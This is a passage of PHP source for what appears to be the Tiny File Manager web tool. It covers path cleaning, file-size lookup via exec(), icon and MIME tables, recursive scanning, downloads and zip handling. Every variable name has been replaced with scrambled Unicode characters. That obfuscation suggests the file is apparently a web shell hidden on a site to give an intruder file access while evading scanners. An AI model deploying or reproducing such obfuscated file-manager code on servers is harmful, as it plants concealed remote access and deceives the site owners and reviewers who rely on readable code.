    $γΌγ‚²γγοΌΌγ„²«„ = str_replace(array('../', '..\\'), '', $γΌγ‚²γγοΌΌγ„²«„);
    $γΌγ‚²γγοΌΌγ„²«„ =  get_absolute_path($γΌγ‚²γγοΌΌγ„²«„);
    if ($γΌγ‚²γγοΌΌγ„²«„ == '..') {
        $γΌγ‚²γγοΌΌγ„²«„ = '';
    }
    return str_replace('\\', '/', $γΌγ‚²γγοΌΌγ„²«„);
}

/**
 * Get parent path
 * @param string $path
 * @return bool|string
 */
function fm_get_parent_path($γΌγ‚²γγοΌΌγ„²«„)
{
    $γΌγ‚²γγοΌΌγ„²«„ = fm_clean_path($γΌγ‚²γγοΌΌγ„²«„);
    if ($γΌγ‚²γγοΌΌγ„²«„ != '') {
        $ΌΎγγγ¦ΌΌγοο‰γ„ = explode('/', $γΌγ‚²γγοΌΌγ„²«„);
        if (count($ΌΎγγγ¦ΌΌγοο‰γ„) > 1) {
            $ΌΎγγγ¦ΌΌγοο‰γ„ = array_slice($ΌΎγγγ¦ΌΌγοο‰γ„, 0, -1);
            return implode('/', $ΌΎγγγ¦ΌΌγοο‰γ„);
        }
        return '';
    }
    return false;
}

function fm_get_display_path($―γ»γγ»®‚γγΌογ)
{
    global $„•ογγ‰γοΌµγγ‚»†, $†¬γγγο¬†γΈΌ‰, $¬„γΌο²γγο„»‚Ώ»;
    switch ($„•ογγ‰γοΌµγγ‚»†) {
        case 'relative':
            return array(
                'label' => 'Path',
                'path' => fm_enc(fm_convert_win(str_replace($†¬γγγο¬†γΈΌ‰, '', $―γ»γγ»®‚γγΌογ)))
            );
        case 'host':
            $†γΎΎ‚¬γγγ‚οΈ‰ = str_replace($†¬γγγο¬†γΈΌ‰, '', $―γ»γγ»®‚γγΌογ);
            return array(
                'label' => 'Host Path',
                'path' => fm_enc(fm_convert_win('/' . $¬„γΌο²γγο„»‚Ώ» . '/' . ltrim(str_replace('\\', '/', $†γΎΎ‚¬γγγ‚οΈ‰), '/')))
            );
        case 'full':
        default:
            return array(
                'label' => 'Full Path',
                'path' => fm_enc(fm_convert_win($―γ»γγ»®‚γγΌογ))
            );
    }
}

/**
 * Check file is in exclude list
 * @param string $file
 * @return bool
 */
function fm_is_exclude_items($γ»γγµ™„‚‚γ)
{
    $γγγ‚‚‚γ«‚γ‰‰Όγο = strtolower(pathinfo($γ»γγµ™„‚‚γ, PATHINFO_EXTENSION));
    if (isset($γ“γγΈ‚γγ„γΏ¦ο‚γ„ογ®) and sizeof($γ“γγΈ‚γγ„γΏ¦ο‚γ„ογ®)) {
        unset($γ“γγΈ‚γγ„γΏ¦ο‚γ„ογ®);
    }

    $γ“γγΈ‚γγ„γΏ¦ο‚γ„ογ® = FM_EXCLUDE_ITEMS;
    if (version_compare(PHP_VERSION, '7.0.0', '<')) {
        $γ“γγΈ‚γγ„γΏ¦ο‚γ„ογ® = unserialize($γ“γγΈ‚γγ„γΏ¦ο‚γ„ογ®);
    }
    if (!in_array($γ»γγµ™„‚‚γ, $γ“γγΈ‚γγ„γΏ¦ο‚γ„ογ®) && !in_array("*.$γγγ‚‚‚γ«‚γ‰‰Όγο", $γ“γγΈ‚γγ„γΏ¦ο‚γ„ογ®)) {
        return true;
    }
    return false;
}

/**
 * get language translations from json file
 * @param int $tr
 * @return array
 */
function fm_get_translations($γγΌγγγγ†γ‚γγ†γ)
{
    try {
        $γογ‚™―γΎγ‰γγΌ = @file_get_contents('translation.json');
        if ($γογ‚™―γΎγ‰γγΌ !== FALSE) {
            $®γγ•‚‚‰‰γ„ογ²γ“γ = json_decode($γογ‚™―γΎγ‰γγΌ, TRUE);
            global $γγγ„γγ‰γγγ‚Όγ‚ογγΌ;
            foreach ($®γγ•‚‚‰‰γ„ογ²γ“γ["language"] as $γγΌΈΌ—ογΌ‚γ¦‰γ‰γ => $γΎ»γΌγ‚ογ†γο“Ώγ‚‚) {
                $ΌΌογο‰γ‚γ¦Ώ = $γΎ»γΌγ‚ογ†γο“Ώγ‚‚["code"];
                $γγγ„γγ‰γγγ‚Όγ‚ογγΌ[$ΌΌογο‰γ‚γ¦Ώ] = $γΎ»γΌγ‚ογ†γο“Ώγ‚‚["name"];
                if ($γγΌγγγγ†γ‚γγ†γ)
                    $γγΌγγγγ†γ‚γγ†γ[$ΌΌογο‰γ‚γ¦Ώ] = $γΎ»γΌγ‚ογ†γο“Ώγ‚‚["translation"];
            }
            return $γγΌγγγγ†γ‚γγ†γ;
        }
    } catch (Exception $γγγΌΌ†ογ‚γγ) {
        echo $γγγΌΌ†ογ‚γγ;
    }
}

/**
 * @param string $file
 * Recover all file sizes larger than > 2GB.
 * Works on php 32bits and 64bits and supports linux
 * @return int|string
 */
function fm_get_size($γ»γγµ™„‚‚γ)
{
    static $γγ„γ²γΈ„γγ = null;
    static $γγ‚γγγγ¬²γο = null;
    static $¦γ„γ«ΌΎ²­γγγΌγ = null;

    // Set static variables once
    if ($γγ„γ²γΈ„γγ === null) {
        $γγ„γ²γΈ„γγ = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
        $γγ‚γγγγ¬²γο = strtoupper(PHP_OS) === 'DARWIN';
        $¦γ„γ«ΌΎ²­γγγΌγ = function_exists('exec') && !ini_get('safe_mode') && @exec('echo EXEC') === 'EXEC';
    }

    // Attempt shell command if exec is available
    if ($¦γ„γ«ΌΎ²­γγγΌγ) {
        $γγ«γ™γγ¦ογ‚οο† = escapeshellarg($γ»γγµ™„‚‚γ);
        $Ώ―µ­¬γ‚γΎ²γΌ = $γγ„γ²γΈ„γγ ? "for %F in (\"$γ»γγµ™„‚‚γ\") do @echo %~zF" : ($γγ‚γγγγ¬²γο ? "stat -f%z $γγ«γ™γγ¦ογ‚οο†" : "stat -c%s $γγ«γ™γγ¦ογ‚οο†");
        @exec($Ώ―µ­¬γ‚γΎ²γΌ, $γγ†γ‰‚„γγ‚);

        if (!empty($γγ†γ‰‚„γγ‚) && ctype_digit($‚γγογο‰»„Όγ = trim(implode("\n", $γγ†γ‰‚„γγ‚)))) {
            return $‚γγογο‰»„Όγ;
        }
    }

    // Attempt Windows COM interface for Windows systems
    if ($γγ„γ²γΈ„γγ && class_exists('COM')) {
        try {
            $‚„‰ο¦‚„γγγ„γ = new COM('Scripting.FileSystemObject');
            $ογ‚γγµγογογΌγ» = $‚„‰ο¦‚„γγγ„γ->GetFile(realpath($γ»γγµ™„‚‚γ));
            if (ctype_digit($‚γγογο‰»„Όγ = $ογ‚γγµγογογΌγ»->Size)) {
                return $‚γγογο‰»„Όγ;
            }
        } catch (Exception $γγγΌΌ†ογ‚γγ) {
            // COM failed, fallback to filesize
        }
    }

    // Default to PHP's filesize function
    return filesize($γ»γγµ™„‚‚γ);
}


/**
 * Get nice filesize
 * @param int $size
 * @return string
 */
function fm_get_filesize($‚γγογο‰»„Όγ)
{
    $‚γγογο‰»„Όγ = (float) $‚γγογο‰»„Όγ;
    $‚¦γγγ―οο―µΌ‰ = array('B', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB');
    $»γ²²ο†γγγγΈοο = ($‚γγογο‰»„Όγ > 0) ? floor(log($‚γγογο‰»„Όγ, 1024)) : 0;
    $»γ²²ο†γγγγΈοο = ($»γ²²ο†γγγγΈοο > (count($‚¦γγγ―οο―µΌ‰) - 1)) ? (count($‚¦γγγ―οο―µΌ‰) - 1) : $»γ²²ο†γγγγΈοο;
    return sprintf('%s %s', round($‚γγογο‰»„Όγ / pow(1024, $»γ²²ο†γγγγΈοο), 2), $‚¦γγγ―οο―µΌ‰[$»γ²²ο†γγγγΈοο]);
}

/**
 * Get info about zip archive
 * @param string $path
 * @return array|bool
 */
function fm_get_zif_info($γΌγ‚²γγοΌΌγ„²«„, $γγγ‚‚‚γ«‚γ‰‰Όγο)
{
    if ($γγγ‚‚‚γ«‚γ‰‰Όγο == 'zip' && function_exists('zip_open')) {
        $„Όγγ«γΈ‚γογ‚γγ = @zip_open($γΌγ‚²γγοΌΌγ„²«„);
        if ($„Όγγ«γΈ‚γογ‚γγ) {
            $“‚†‚‚γγ»γΏ‚‚γ­‰® = array();
            while ($Ό®γ­γγ―γγ = @zip_read($„Όγγ«γΈ‚γογ‚γγ)) {
                $¦Έγ„ΌοοΌ¬«Όγ»γγ = @zip_entry_name($Ό®γ­γγ―γγ);
                $‚γΌγγ¦„γ‰††‹ = substr($¦Έγ„ΌοοΌ¬«Όγ»γγ, -1) == '/';
                $“‚†‚‚γγ»γΏ‚‚γ­‰®[] = array(
                    'name' => $¦Έγ„ΌοοΌ¬«Όγ»γγ,
                    'filesize' => @zip_entry_filesize($Ό®γ­γγ―γγ),
                    'compressed_size' => @zip_entry_compressedsize($Ό®γ­γγ―γγ),
                    'folder' => $‚γΌγγ¦„γ‰††‹
                    //'compression_method' => zip_entry_compressionmethod($zip_entry),
                );
            }
            @zip_close($„Όγγ«γΈ‚γογ‚γγ);
            return $“‚†‚‚γγ»γΏ‚‚γ­‰®;
        }
    } elseif ($γγγ‚‚‚γ«‚γ‰‰Όγο == 'tar' && class_exists('PharData')) {
        $ο»Ύγγ‹‰‰„²‰γγΌ‰γ‰ = new PharData($γΌγ‚²γγοΌΌγ„²«„);
        $“‚†‚‚γγ»γΏ‚‚γ­‰® = array();
        foreach (new RecursiveIteratorIterator($ο»Ύγγ‹‰‰„²‰γγΌ‰γ‰) as $γ»γγµ™„‚‚γ) {
            $Ώ­²ογγΌ‰γΌ»Ό²γ† = $γ»γγµ™„‚‚γ->getPathInfo();
            $¦Έγ„ΌοοΌ¬«Όγ»γγ = str_replace("phar://" . $γΌγ‚²γγοΌΌγ„²«„, '', $γ»γγµ™„‚‚γ->getPathName());
            $¦Έγ„ΌοοΌ¬«Όγ»γγ = substr($¦Έγ„ΌοοΌ¬«Όγ»γγ, ($ογΌΌΌγ•γγΎγγ²γο† = strpos($¦Έγ„ΌοοΌ¬«Όγ»γγ, '/')) !== false ? $ογΌΌΌγ•γγΎγγ²γο† + 1 : 0);
            $‚γΌγγ¦„γ‰††‹ = $Ώ­²ογγΌ‰γΌ»Ό²γ†->getFileName();
            $‰γγγγ„γΈγγγγ‚ = new SplFileInfo($γ»γγµ™„‚‚γ);
            $“‚†‚‚γγ»γΏ‚‚γ­‰®[] = array(
                'name' => $¦Έγ„ΌοοΌ¬«Όγ»γγ,
                'filesize' => $‰γγγγ„γΈγγγγ‚->getSize(),
                'compressed_size' => $γ»γγµ™„‚‚γ->getCompressedSize(),
                'folder' => $‚γΌγγ¦„γ‰††‹
            );
        }
        return $“‚†‚‚γγ»γΏ‚‚γ­‰®;
    }
    return false;
}

/**
 * Encode html entities
 * @param string $text
 * @return string
 */
function fm_enc($ΌΌοΌ»„™¦γΈγγγγΈ)
{
    return htmlspecialchars($ΌΌοΌ»„™¦γΈγγγγΈ, ENT_QUOTES, 'UTF-8');
}

/**
 * Prevent XSS attacks
 * @param string $text
 * @return string
 */
function fm_isvalid_filename($ΌΌοΌ»„™¦γΈγγγγΈ)
{
    return (strpbrk($ΌΌοΌ»„™¦γΈγγγγΈ, '/?%*:|"<>') === FALSE) ? true : false;
}

/**
 * Save message in session
 * @param string $msg
 * @param string $status
 */
function fm_set_msg($‚γ†γ²•„γ„γΌγ‚γ•‚, $γ—Όγγ„γγ»Ό‚‚ = 'ok')
{
    $_SESSION[FM_SESSION_ID]['message'] = $‚γ†γ²•„γ„γΌγ‚γ•‚;
    $_SESSION[FM_SESSION_ID]['status'] = $γ—Όγγ„γγ»Ό‚‚;
}

/**
 * Check if string is in UTF-8
 * @param string $string
 * @return int
 */
function fm_is_utf8($γο‰οΈγΏ‹γ»²γΌ)
{
    return preg_match('//u', $γο‰οΈγΏ‹γ»²γΌ);
}

/**
 * Convert file name to UTF-8 in Windows
 * @param string $filename
 * @return string
 */
function fm_convert_win($γµΌ„γγγογ²“‚‰»ΌΌ)
{
    if (FM_IS_WIN && function_exists('iconv')) {
        $γµΌ„γγγογ²“‚‰»ΌΌ = iconv(FM_ICONV_INPUT_ENC, 'UTF-8//IGNORE', $γµΌ„γγγογ²“‚‰»ΌΌ);
    }
    return $γµΌ„γγγογ²“‚‰»ΌΌ;
}

/**
 * @param $obj
 * @return array
 */
function fm_object_to_array($γ»‚γ‚γγγ‚γγΈΏ²γγ)
{
    if (!is_object($γ»‚γ‚γγγ‚γγΈΏ²γγ) && !is_array($γ»‚γ‚γγγ‚γγΈΏ²γγ)) {
        return $γ»‚γ‚γγγ‚γγΈΏ²γγ;
    }
    if (is_object($γ»‚γ‚γγγ‚γγΈΏ²γγ)) {
        $γ»‚γ‚γγγ‚γγΈΏ²γγ = get_object_vars($γ»‚γ‚γγγ‚γγΈΏ²γγ);
    }
    return array_map('fm_object_to_array', $γ»‚γ‚γγγ‚γγΈΏ²γγ);
}

/**
 * Get CSS classname for file
 * @param string $path
 * @return string
 */
function fm_get_file_icon_class($γΌγ‚²γγοΌΌγ„²«„)
{
    // get extension
    $γγγ‚‚‚γ«‚γ‰‰Όγο = strtolower(pathinfo($γΌγ‚²γγοΌΌγ„²«„, PATHINFO_EXTENSION));

    switch ($γγγ‚‚‚γ«‚γ‰‰Όγο) {
        case 'ico':
        case 'gif':
        case 'jpg':
        case 'jpeg':
        case 'jpc':
        case 'jp2':
        case 'jpx':
        case 'xbm':
        case 'wbmp':
        case 'png':
        case 'bmp':
        case 'tif':
        case 'tiff':
        case 'webp':
        case 'avif':
        case 'svg':
            $γ„²²γ‚γ„ = 'fa fa-picture-o';
            break;
        case 'passwd':
        case 'ftpquota':
        case 'sql':
        case 'js':
        case 'ts':
        case 'jsx':
        case 'tsx':
        case 'hbs':
        case 'json':
        case 'sh':
        case 'config':
        case 'twig':
        case 'tpl':
        case 'md':
        case 'gitignore':
        case 'c':
        case 'cpp':
        case 'cs':
        case 'py':
        case 'rs':
        case 'map':
        case 'lock':
        case 'dtd':
        case 'ps1':
            $γ„²²γ‚γ„ = 'fa fa-file-code-o';
            break;
        case 'txt':
        case 'ini':
        case 'conf':
        case 'log':
        case 'htaccess':
        case 'yaml':
        case 'yml':
        case 'toml':
        case 'tmp':
        case 'top':
        case 'bot':
        case 'dat':
        case 'bak':
        case 'htpasswd':
        case 'pl':
            $γ„²²γ‚γ„ = 'fa fa-file-text-o';
            break;
        case 'css':
        case 'less':
        case 'sass':
        case 'scss':
            $γ„²²γ‚γ„ = 'fa fa-css3';
            break;
        case 'bz2':
        case 'tbz2':
        case 'tbz':
        case 'zip':
        case 'rar':
        case 'gz':
        case 'tgz':
        case 'tar':
        case '7z':
        case 'xz':
        case 'txz':
        case 'zst':
        case 'tzst':
            $γ„²²γ‚γ„ = 'fa fa-file-archive-o';
            break;
        case 'php':
        case 'php4':
        case 'php5':
        case 'phps':
        case 'phtml':
            $γ„²²γ‚γ„ = 'fa fa-code';
            break;
        case 'htm':
        case 'html':
        case 'shtml':
        case 'xhtml':
            $γ„²²γ‚γ„ = 'fa fa-html5';
            break;
        case 'xml':
        case 'xsl':
            $γ„²²γ‚γ„ = 'fa fa-file-excel-o';
            break;
        case 'wav':
        case 'mp3':
        case 'mp2':
        case 'm4a':
        case 'aac':
        case 'ogg':
        case 'oga':
        case 'wma':
        case 'mka':
        case 'flac':
        case 'ac3':
        case 'tds':
            $γ„²²γ‚γ„ = 'fa fa-music';
            break;
        case 'm3u':
        case 'm3u8':
        case 'pls':
        case 'cue':
        case 'xspf':
            $γ„²²γ‚γ„ = 'fa fa-headphones';
            break;
        case 'avi':
        case 'mpg':
        case 'mpeg':
        case 'mp4':
        case 'm4v':
        case 'flv':
        case 'f4v':
        case 'ogm':
        case 'ogv':
        case 'mov':
        case 'mkv':
        case '3gp':
        case 'asf':
        case 'wmv':
        case 'webm':
            $γ„²²γ‚γ„ = 'fa fa-file-video-o';
            break;
        case 'eml':
        case 'msg':
            $γ„²²γ‚γ„ = 'fa fa-envelope-o';
            break;
        case 'xls':
        case 'xlsx':
        case 'ods':
            $γ„²²γ‚γ„ = 'fa fa-file-excel-o';
            break;
        case 'csv':
            $γ„²²γ‚γ„ = 'fa fa-file-text-o';
            break;
        case 'bak':
        case 'swp':
            $γ„²²γ‚γ„ = 'fa fa-clipboard';
            break;
        case 'doc':
        case 'docx':
        case 'odt':
            $γ„²²γ‚γ„ = 'fa fa-file-word-o';
            break;
        case 'ppt':
        case 'pptx':
            $γ„²²γ‚γ„ = 'fa fa-file-powerpoint-o';
            break;
        case 'ttf':
        case 'ttc':
        case 'otf':
        case 'woff':
        case 'woff2':
        case 'eot':
        case 'fon':
            $γ„²²γ‚γ„ = 'fa fa-font';
            break;
        case 'pdf':
            $γ„²²γ‚γ„ = 'fa fa-file-pdf-o';
            break;
        case 'psd':
        case 'ai':
        case 'eps':
        case 'fla':
        case 'swf':
            $γ„²²γ‚γ„ = 'fa fa-file-image-o';
            break;
        case 'exe':
        case 'msi':
            $γ„²²γ‚γ„ = 'fa fa-file-o';
            break;
        case 'bat':
            $γ„²²γ‚γ„ = 'fa fa-terminal';
            break;
        default:
            $γ„²²γ‚γ„ = 'fa fa-info-circle';
    }

    return $γ„²²γ‚γ„;
}

/**
 * Get image files extensions
 * @return array
 */
function fm_get_image_exts()
{
    return array('ico', 'gif', 'jpg', 'jpeg', 'jpc', 'jp2', 'jpx', 'xbm', 'wbmp', 'png', 'bmp', 'tif', 'tiff', 'psd', 'svg', 'webp', 'avif');
}

/**
 * Get video files extensions
 * @return array
 */
function fm_get_video_exts()
{
    return array('avi', 'webm', 'wmv', 'mp4', 'm4v', 'ogm', 'ogv', 'mov', 'mkv');
}

/**
 * Get audio files extensions
 * @return array
 */
function fm_get_audio_exts()
{
    return array('wav', 'mp3', 'ogg', 'm4a');
}

/**
 * Get text file extensions
 * @return array
 */
function fm_get_text_exts()
{
    return array(
        'txt',
        'css',
        'ini',
        'conf',
        'log',
        'htaccess',
        'passwd',
        'ftpquota',
        'sql',
        'js',
        'ts',
        'jsx',
        'tsx',
        'mjs',
        'json',
        'sh',
        'config',
        'php',
        'php4',
        'php5',
        'phps',
        'phtml',
        'htm',
        'html',
        'shtml',
        'xhtml',
        'xml',
        'xsl',
        'm3u',
        'm3u8',
        'pls',
        'cue',
        'bash',
        'vue',
        'eml',
        'msg',
        'csv',
        'bat',
        'twig',
        'tpl',
        'md',
        'gitignore',
        'less',
        'sass',
        'scss',
        'c',
        'cpp',
        'cs',
        'py',
        'go',
        'zsh',
        'swift',
        'map',
        'lock',
        'dtd',
        'svg',
        'asp',
        'aspx',
        'asx',
        'asmx',
        'ashx',
        'jsp',
        'jspx',
        'cgi',
        'dockerfile',
        'ruby',
        'yml',
        'yaml',
        'toml',
        'vhost',
        'scpt',
        'applescript',
        'csx',
        'cshtml',
        'c++',
        'coffee',
        'cfm',
        'rb',
        'graphql',
        'mustache',
        'jinja',
        'http',
        'handlebars',
        'java',
        'es',
        'es6',
        'markdown',
        'wiki',
        'tmp',
        'top',
        'bot',
        'dat',
        'bak',
        'htpasswd',
        'pl',
        'ps1'
    );
}

/**
 * Get mime types of text files
 * @return array
 */
function fm_get_text_mimes()
{
    return array(
        'application/xml',
        'application/javascript',
        'application/x-javascript',
        'image/svg+xml',
        'message/rfc822',
        'application/json',
    );
}

/**
 * Get file names of text files w/o extensions
 * @return array
 */
function fm_get_text_names()
{
    return array(
        'license',
        'readme',
        'authors',
        'contributors',
        'changelog',
    );
}

/**
 * Get online docs viewer supported files extensions
 * @return array
 */
function fm_get_onlineViewer_exts()
{
    return array('doc', 'docx', 'xls', 'xlsx', 'pdf', 'ppt', 'pptx', 'ai', 'psd', 'dxf', 'xps', 'rar', 'odt', 'ods');
}

/**
 * It returns the mime type of a file based on its extension.
 * @param extension The file extension of the file you want to get the mime type for.
 * @return string|string[] The mime type of the file.
 */
function fm_get_file_mimes($­―γ„γΌ‰―ΌΌΈγ™γγοο)
{
    $γ‰γγογΌγΌ†γ‚γγ™γ“['swf'] = 'application/x-shockwave-flash';
    $γ‰γγογΌγΌ†γ‚γγ™γ“['pdf'] = 'application/pdf';
    $γ‰γγογΌγΌ†γ‚γγ™γ“['exe'] = 'application/octet-stream';
    $γ‰γγογΌγΌ†γ‚γγ™γ“['zip'] = 'application/zip';
    $γ‰γγογΌγΌ†γ‚γγ™γ“['doc'] = 'application/msword';
    $γ‰γγογΌγΌ†γ‚γγ™γ“['xls'] = 'application/vnd.ms-excel';
    $γ‰γγογΌγΌ†γ‚γγ™γ“['ppt'] = 'application/vnd.ms-powerpoint';
    $γ‰γγογΌγΌ†γ‚γγ™γ“['gif'] = 'image/gif';
    $γ‰γγογΌγΌ†γ‚γγ™γ“['png'] = 'image/png';
    $γ‰γγογΌγΌ†γ‚γγ™γ“['jpeg'] = 'image/jpg';
    $γ‰γγογΌγΌ†γ‚γγ™γ“['jpg'] = 'image/jpg';
    $γ‰γγογΌγΌ†γ‚γγ™γ“['webp'] = 'image/webp';
    $γ‰γγογΌγΌ†γ‚γγ™γ“['avif'] = 'image/avif';
    $γ‰γγογΌγΌ†γ‚γγ™γ“['rar'] = 'application/rar';

    $γ‰γγογΌγΌ†γ‚γγ™γ“['ra'] = 'audio/x-pn-realaudio';
    $γ‰γγογΌγΌ†γ‚γγ™γ“['ram'] = 'audio/x-pn-realaudio';
    $γ‰γγογΌγΌ†γ‚γγ™γ“['ogg'] = 'audio/x-pn-realaudio';

    $γ‰γγογΌγΌ†γ‚γγ™γ“['wav'] = 'video/x-msvideo';
    $γ‰γγογΌγΌ†γ‚γγ™γ“['wmv'] = 'video/x-msvideo';
    $γ‰γγογΌγΌ†γ‚γγ™γ“['avi'] = 'video/x-msvideo';
    $γ‰γγογΌγΌ†γ‚γγ™γ“['asf'] = 'video/x-msvideo';
    $γ‰γγογΌγΌ†γ‚γγ™γ“['divx'] = 'video/x-msvideo';

    $γ‰γγογΌγΌ†γ‚γγ™γ“['mp3'] = 'audio/mpeg';
    $γ‰γγογΌγΌ†γ‚γγ™γ“['mp4'] = 'audio/mpeg';
    $γ‰γγογΌγΌ†γ‚γγ™γ“['mpeg'] = 'video/mpeg';
    $γ‰γγογΌγΌ†γ‚γγ™γ“['mpg'] = 'video/mpeg';
    $γ‰γγογΌγΌ†γ‚γγ™γ“['mpe'] = 'video/mpeg';
    $γ‰γγογΌγΌ†γ‚γγ™γ“['mov'] = 'video/quicktime';
    $γ‰γγογΌγΌ†γ‚γγ™γ“['swf'] = 'video/quicktime';
    $γ‰γγογΌγΌ†γ‚γγ™γ“['3gp'] = 'video/quicktime';
    $γ‰γγογΌγΌ†γ‚γγ™γ“['m4a'] = 'video/quicktime';
    $γ‰γγογΌγΌ†γ‚γγ™γ“['aac'] = 'video/quicktime';
    $γ‰γγογΌγΌ†γ‚γγ™γ“['m3u'] = 'video/quicktime';

    $γ‰γγογΌγΌ†γ‚γγ™γ“['php'] = ['application/x-php'];
    $γ‰γγογΌγΌ†γ‚γγ™γ“['html'] = ['text/html'];
    $γ‰γγογΌγΌ†γ‚γγ™γ“['txt'] = ['text/plain'];
    //Unknown mime-types should be 'application/octet-stream'
    if (empty($γ‰γγογΌγΌ†γ‚γγ™γ“[$­―γ„γΌ‰―ΌΌΈγ™γγοο])) {
        $γ‰γγογΌγΌ†γ‚γγ™γ“[$­―γ„γΌ‰―ΌΌΈγ™γγοο] = ['application/octet-stream'];
    }
    return $γ‰γγογΌγΌ†γ‚γγ™γ“[$­―γ„γΌ‰―ΌΌΈγ™γγοο];
}

/**
 * This function scans the files and folder recursively, and return matching files
 * @param string $dir
 * @param string $filter
 * @return array|null
 */
function scan($γγ‹­γ‰γγγγΌ»γγ‰ = '', $Όµγ†γ²―γγογγ = '')
{
    $γΌγ‚²γγοΌΌγ„²«„ = FM_ROOT_PATH . '/' . $γγ‹­γ‰γγγγΌ»γγ‰;
    if ($γΌγ‚²γγοΌΌγ„²«„) {
        $γ‰Όγγογοο―γγο„γ = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($γΌγ‚²γγοΌΌγ„²«„));
        $γγγγγγγγ‚γ‰µΌ = new RegexIterator($γ‰Όγγογοο―γγο„γ, "/(" . $Όµγ†γ²―γγογγ . ")/i");

        $ο‚γΌγγγ»‚γ‰Όγ‚ = array();
        foreach ($γγγγγγγγ‚γ‰µΌ as $γ»γγµ™„‚‚γ) {
            if (!$γ»γγµ™„‚‚γ->isDir()) {
                $γ†„ο‚ο„‰†γγ = $γ»γγµ™„‚‚γ->getFilename();
                $γγ‚γ‚γ„†γ„Έγγ² = str_replace(FM_ROOT_PATH, '', $γ»γγµ™„‚‚γ->getPath());
                $ο‚γΌγγγ»‚γ‰Όγ‚[] = array(
                    "name" => $γ†„ο‚ο„‰†γγ,
                    "type" => "file",
                    "path" => $γγ‚γ‚γ„†γ„Έγγ²,
                );
            }
        }
        return $ο‚γΌγγγ»‚γ‰Όγ‚;
    }
}

/**
 * Parameters: downloadFile(File Location, File Name,
 * max speed, is streaming
 * If streaming - videos will show as videos, images as images
 * instead of download prompt
 * https://stackoverflow.com/a/13821992/1164642
 */
function fm_download_file($ΏγοοΈΌγ†ογ•­, $γ†„ο‚ο„‰†γγ, $‚γογγγγγ†γγ‚γ  = 1024)
{
    if (connection_status() != 0)
        return (false);
    $­―γ„γΌ‰―ΌΌΈγ™γγοο = pathinfo($γ†„ο‚ο„‰†γγ, PATHINFO_EXTENSION);

    $ογ‚¦γ“‰γ­¬γ„²γ„γγ = fm_get_file_mimes($­―γ„γΌ‰―ΌΌΈγ™γγοο);

    if (is_array($ογ‚¦γ“‰γ­¬γ„²γ„γγ)) {
        $ογ‚¦γ“‰γ­¬γ„²γ„γγ = implode(' ', $ογ‚¦γ“‰γ­¬γ„²γ„γγ);
    }

    $‚γγογο‰»„Όγ = filesize($ΏγοοΈΌγ†ογ•­);

    if ($‚γγογο‰»„Όγ == 0) {
        fm_set_msg(lng('Zero byte file! Aborting download'), 'error');
        $‚¦γγγ‚γγ‰γΈΌΏ = FM_PATH;
        fm_redirect(FM_SELF_URL . '?p=' . urlencode($‚¦γγγ‚γγ‰γΈΌΏ));

        return (false);
    }

    @ini_set('magic_quotes_runtime', 0);
    $Όγ»ο‚γο‚‚ογγ‚ = fopen("$ΏγοοΈΌγ†ογ•­", "rb");

    if ($Όγ»ο‚γο‚‚ογγ‚ === false) {
        fm_set_msg(lng('Cannot open file! Aborting download'), 'error');
        $‚¦γγγ‚γγ‰γΈΌΏ = FM_PATH;
        fm_redirect(FM_SELF_URL . '?p=' . urlencode($‚¦γγγ‚γγ‰γΈΌΏ));
        return (false);
    }

    // headers
    header('Content-Description: File Transfer');
    header('Expires: 0');
    header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
    header('Pragma: public');
    header("Content-Transfer-Encoding: binary");
    header("Content-Type: $ογ‚¦γ“‰γ­¬γ„²γ„γγ");

    $†γγγγγ™γγγ†γ‚‚ = 'attachment';

    if (strstr($_SERVER['HTTP_USER_AGENT'], "MSIE")) {
        $γ†„ο‚ο„‰†γγ = preg_replace('/\./', '%2e', $γ†„ο‚ο„‰†γγ, substr_count($γ†„ο‚ο„‰†γγ, '.') - 1);
        header("Content-Disposition: $†γγγγγ™γγγ†γ‚‚;filename=\"$γ†„ο‚ο„‰†γγ\"");
    } else {
        header("Content-Disposition: $†γγγγγ™γγγ†γ‚‚;filename=\"$γ†„ο‚ο„‰†γγ\"");
    }

    header("Accept-Ranges: bytes");
    $„Ό‰γγγγγΏΌ†γ = 0;

    if (isset($_SERVER['HTTP_RANGE'])) {
        list($†γγ‚‰‚γΈγγ•‚γ‹, $„Ό‰γγγγγΏΌ†γ) = explode("=", $_SERVER['HTTP_RANGE']);
        str_replace($„Ό‰γγγγγΏΌ†γ, "-", $„Ό‰γγγγγΏΌ†γ);
        $Ώγ²γ„γγ‰Ό†‰™γΌγ = $‚γγογο‰»„Όγ - 1;
        $µ‚γγγ™γΌ―Ό™γ‚‚γ = $‚γγογο‰»„Όγ - $„Ό‰γγγγγΏΌ†γ;
        header("HTTP/1.1 206 Partial Content");
        header("Content-Length: $µ‚γγγ™γΌ―Ό™γ‚‚γ");
        header("Content-Range: bytes $„Ό‰γγγγγΏΌ†γ$Ώγ²γ„γγ‰Ό†‰™γΌγ/$‚γγογο‰»„Όγ");
    } else {
        $Ώγ²γ„γγ‰Ό†‰™γΌγ = $‚γγογο‰»„Όγ - 1;
        header("Content-Range: bytes 0-$Ώγ²γ„γγ‰Ό†‰™γΌγ/$‚γγογο‰»„Όγ");
        header("Content-Length: " . $‚γγογο‰»„Όγ);
    }
    $ΏγοοΈΌγ†ογ•­ = realpath($ΏγοοΈΌγ†ογ•­);
    while (ob_get_level()) ob_end_clean();
    readfile($ΏγοοΈΌγ†ογ•­);

    fclose($Όγ»ο‚γο‚‚ογγ‚);

    return ((connection_status() == 0) and !connection_aborted());
}

/**
 * Class to work with zip files (using ZipArchive)
 */
class FM_Zipper
{
    private $γγ²ογ™γΌ„Όγ‚;

    public function __construct()
    {
        $this->zip = new ZipArchive();
    }

    /**
     * Create archive with name $filename and files $files (RELATIVE PATHS!)
     * @param string $filename
     * @param array|string $files
     * @return bool
     */
    public function create($γµΌ„γγγογ²“‚‰»ΌΌ, $ο‚γΌγγγ»‚γ‰Όγ‚)
    {
        $Όγγο»γΌ‰•ΌΌ™‚ = $this->zip->open($γµΌ„γγγογ²“‚‰»ΌΌ, ZipArchive::CREATE);
        if ($Όγγο»γΌ‰•ΌΌ™‚ !== true) {
            return false;
        }
        if (is_array($ο‚γΌγγγ»‚γ‰Όγ‚)) {
            foreach ($ο‚γΌγγγ»‚γ‰Όγ‚ as $ογ‚γγµγογογΌγ») {
                $ογ‚γγµγογογΌγ» = fm_clean_path($ογ‚γγµγογογΌγ»);
